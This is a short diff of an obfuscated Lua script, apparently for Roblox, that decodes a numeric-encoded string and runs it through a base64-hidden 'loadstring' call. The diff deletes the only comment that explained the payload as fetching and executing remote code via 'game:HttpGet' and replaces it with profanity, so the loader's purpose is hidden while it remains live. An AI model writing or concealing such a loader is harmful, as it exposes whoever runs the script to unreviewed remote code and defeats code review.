@@ -10,7 +10,7 @@ local function decode(str)
     return str:gsub('%d+', function(c) return string.char(tonumber(c)) end):gsub(',', '')
 end
 
-local script = decode(a)  -- 结果为 loadstring(game:HttpGet('https://...'))()
+local script = decode(a)  -- fuck
 
 -- fuck
 _[([[bG9hZHN0cmluZw==]])](script)()
